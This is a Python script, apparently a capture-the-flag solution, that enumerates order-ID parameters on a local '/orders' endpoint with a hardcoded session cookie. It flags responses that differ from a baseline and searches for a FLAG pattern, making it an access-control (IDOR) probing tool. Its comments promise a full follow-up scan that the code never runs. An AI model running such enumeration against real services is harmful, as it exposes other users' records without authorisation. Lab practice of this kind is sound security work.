import requests
import re
import sys
from collections import defaultdict

target_url = "http://127.0.0.1:32941/orders"
session_cookie = {'session': 'eyJ1c2VyX2lkIjoxMDAzMn0.aVLQrQ.UwvtLfYsm3gR5lOsx-SapY2s4r0'}

parameters_to_test = ['id', 'order', 'order_id', 'trade', 'trade_id']
test_range = range(0, 1001)  # 0-1000 inclusive

# Track baseline responses and anomalies
baseline_responses = {}
anomalies = []
flag_found = False
flag_value = None
unique_responses = {}

print("[+] Starting batch enumeration of order parameters")
print(f"[+] Testing {len(parameters_to_test)} parameters across {len(test_range)} values each")
print("[+] Target URL: " + target_url)
print("-" * 60)

# First, establish baseline by testing without parameters
print("\n[+] Establishing baseline response...")
try:
    baseline_resp = requests.get(target_url, cookies=session_cookie, timeout=10)
    baseline_status = baseline_resp.status_code
    baseline_content = baseline_resp.text
    baseline_length = len(baseline_content)
    print(f"[+] Baseline status: {baseline_status} | Length: {baseline_length}B")
except Exception as e:
    print(f"[-] Failed to get baseline: {e}")
    baseline_status = None
    baseline_content = ""
    baseline_length = 0

# Test each parameter
for param in parameters_to_test:
    print(f"\n[+] Testing parameter: {param}")
    parameter_anomalies = []
    unique_count = 0
    
    # Test every 20th value initially to find patterns, then full range if anomalies found
    test_values = list(range(0, 1001, 20))  # test 0, 20, 40, 60...
    
    for value in test_values:
        try:
            resp = requests.get(f"{target_url}?{param}={value}", 
                              cookies=session_cookie, 
                              timeout=10)
            
            content_length = len(resp.text)
            
            # Check for FLAG pattern
            flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
            if flag_match:
                flag_found = True
                flag_value = flag_match.group(0)
                print(f"\n[!] FLAG FOUND with {param}={value}")
                print(f"[!] FLAG: {flag_value}")
                print(f"[!] Full response:\n{resp.text}")
            
            # Check if response differs from baseline
            is_different = False
            if resp.status_code != baseline_status:
                is_different = True
            elif abs(content_length - baseline_length) > 50:  # Allow small variations
                is_different = True
            elif resp.text != baseline_content:
                is_different = True
            
            if is_different:
                anomaly_data = {
                    'param': param,
                    'value': value,
                    'status': resp.status_code,
                    'length': content_length,
                    'diff_from_baseline': content_length - baseline_length
                }
                parameter_anomalies.append(anomaly_data)
                unique_count += 1
                
                print(f"\n[ANOMALY] {param}={value}")
                print(f"  Status: {resp.status_code} (Baseline: {baseline_status})")
                print(f"  Length: {content_length}B (Baseline: {baseline_length}B)")
                print(f"  Diff: {content_length - baseline_length}B")
                
                # Print first 200 chars of response for analysis
                preview = resp.text[:200].replace('\n', ' ')
                print(f"  Preview: {preview}...")
        
        except Exception as e:
            print(f"[-] Error with {param}={value}: {e}")
            continue
    
    anomalies.extend(parameter_anomalies)
    unique_responses[param] = unique_count
    print(f"[+] {param}: Found {unique_count} unique responses out of {len(test_values)} tested")

# If we found anomalies, do a full exhaustive scan on those parameters
print("\n" + "=" * 60)
print("[+] SUMMARY AND ANALYSIS")
print("=" * 60)

if anomalies:
    print(f"[+] Found {len(anomalies)} total anomalies across parameters")
    for anomaly in anomalies:
        print(f"  - {anomaly['param']}={anomaly['value']}: Status {anomaly['status']}, Length {anomaly['length']}B")
else:
    print("[-] No significant anomalies found in initial scan")

# If flag found, print it prominently
if flag_found:
    print(f"\n[!] CONFIRMED FLAG: {flag_value}")
else:
    print("\n[-] No FLAG pattern found in any response")

# If we found anomalies, suggest next steps
if anomalies and not flag_found:
    print("\n[+] Recommendations:")
    print("  1. Run full exhaustive scan (0-1000) on parameters with anomalies")
    print("  2. Test other endpoints for related data")
    print("  3. Analyze response patterns for hidden information")

print("\n[+] Test completed")
sys.stdout.flush()

# Return results for analysis
result = {
    'flag_found': flag_found,
    'flag_value': flag_value,
    'total_anomalies': len(anomalies),
    'parameters_tested': parameters_to_test,
    'unique_responses_by_param': unique_responses
}
print(f"\n[RESULT] {result}")
